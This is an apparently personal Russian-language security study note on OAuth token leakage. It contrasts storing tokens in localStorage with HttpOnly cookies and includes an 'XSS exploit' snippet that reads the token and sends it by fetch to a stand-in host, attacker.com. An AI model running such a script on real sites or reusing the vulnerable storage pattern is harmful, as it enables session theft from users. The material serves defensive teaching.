
# 🚨 Token Leakage

## 📌 Суть

Токен утёк → доступ украден

---

## 💥 Где это происходит

- URL (`?access_token=...`)
- logs
- localStorage
- browser history

---

## 💻 Уязвимый код

```
// ❌ хранение в localStorage  
localStorage.setItem("access_token", token);
```

---

## 💥 XSS exploit

```
// attacker script  
const token = localStorage.getItem("access_token");  
fetch("https://attacker.com/steal?token=" + token);
```

---

## ✅ Защита

```
// ✔ HttpOnly cookie (недоступен JS)  
res.cookie("session", sessionId, {  
  httpOnly: true,  
  secure: true,  
  sameSite: "Strict"  
});
```

---

## 🧠 Ключевая идея

если JS может читать токен → его украдут

# Связи
- [[Knowledge/Authentication & Authorization/OAuth/Overview|Overview]]
- [[Data & Credentials]]
- [[Attacks]]
- [[Security]]